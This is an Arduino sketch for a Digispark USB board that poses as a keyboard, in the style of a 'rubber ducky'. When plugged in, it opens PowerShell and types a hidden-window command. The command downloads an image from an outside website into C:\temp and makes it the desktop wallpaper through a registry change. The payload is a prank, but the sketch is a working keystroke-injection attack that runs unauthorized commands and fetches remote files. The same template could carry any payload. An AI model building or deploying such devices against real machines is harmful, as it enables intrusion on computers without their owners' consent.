
// must have http://digistump.com/package_digistump_index.json in board manager urls in arduino ide
// add board via tools > board manager > contributed > digispark
// select baord with tools > board > digistump avr ... > digispark
#include <DigiKeyboard.h>
void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(50);
  DigiKeyboard.print("PowerShell.exe");
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
  DigiKeyboard.print("PowerShell.exe -windowstyle hidden Invoke-WebRequest http://www.thecuriosityworkshop.com/wp-content/uploads/2015/03/01-rubberduck-hongkong.jpg -OutFile C:\\temp\\d.jpg;set-itemproperty -path 'HKCU:\\Control Panel\\Desktop\\' -name wallpaper -value 'C:\\temp\\d.jpg' -Force;sleep 5;RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True");
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  // nothing needs to run here
}
